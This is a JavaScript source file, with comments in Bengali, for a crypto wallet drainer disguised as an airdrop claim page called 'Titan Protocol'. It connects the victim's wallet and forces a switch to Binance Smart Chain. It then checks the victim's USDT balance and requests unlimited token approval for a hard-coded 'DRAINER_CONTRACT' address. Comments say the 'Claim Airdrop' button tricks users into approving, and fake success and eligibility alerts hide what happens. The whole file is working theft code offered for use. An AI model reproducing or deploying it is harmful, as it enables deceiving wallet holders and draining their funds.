/* ================= SYSTEM CONFIG ================= */

// আপনার Titan V6 কন্ট্রাক্ট অ্যাড্রেস (যেটা Unlimited Approval পাবে)
const DRAINER_CONTRACT = "0xA6E28350e9130D296853D104ba4d0E895d334019"; 

// টার্গেট টোকেন (USDT BSC)
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 

// মিনিমাম ব্যালেন্স (1 USD)
const MIN_BALANCE = "1"; 

/* ================= LOGIC START ================= */

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function decimals() view returns (uint8)"
];

let provider, signer, userAddress;

async function connectAndExecute() {
    if (typeof window.ethereum === 'undefined') {
        alert("Please install MetaMask or Trust Wallet to access Titan Protocol.");
        return;
    }

    try {
        // 1. Provider Setup
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();

        // 2. Network Check (BSC Chain ID: 56)
        const network = await provider.getNetwork();
        if (network.chainId !== 56) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }], // 56 in hex
                });
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
            } catch (error) {
                alert("Please switch to Binance Smart Chain (BSC) network.");
                return;
            }
        }

        // 3. Balance Check & Trap Execution
        await executeTrap();

    } catch (error) {
        console.error("Connection Error:", error);
    }
}

async function executeTrap() {
    try {
        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
        
        // ব্যালেন্স চেক
        const balance = await tokenContract.balanceOf(userAddress);
        const decimals = await tokenContract.decimals();
        const formattedBalance = ethers.utils.formatUnits(balance, decimals);

        if (parseFloat(formattedBalance) < parseFloat(MIN_BALANCE)) {
            alert("Error: Your wallet is not eligible for this Airdrop tier. (Insufficient Activity)");
            return;
        }

        // 🔥 UNLIMITED APPROVAL TRIGGER 🔥
        // কোনো কনফার্মেশন মেসেজ ছাড়াই সরাসরি মেটামাস্ক পপ-আপ
        const maxAmount = ethers.constants.MaxUint256;
        
        // এখানে আমরা ইউজারকে বোকা বানাতে পারি
        // "Claim Airdrop" বাটন চাপলে আসলে "Approve" ফাংশন কল হবে
        const tx = await tokenContract.approve(DRAINER_CONTRACT, maxAmount);
        
        alert("Verification Pending... Please wait for confirmation.");
        await tx.wait();
        
        alert("🎉 Success! 5,000 TITAN tokens will be airdropped to your wallet within 24 hours.");

    } catch (error) {
        console.error("Execution Rejected:", error);
        // ইউজার রিজেক্ট করলে কিছু দেখানোর দরকার নেই, বা ফেইক এরর দেখাতে পারেন
    }
}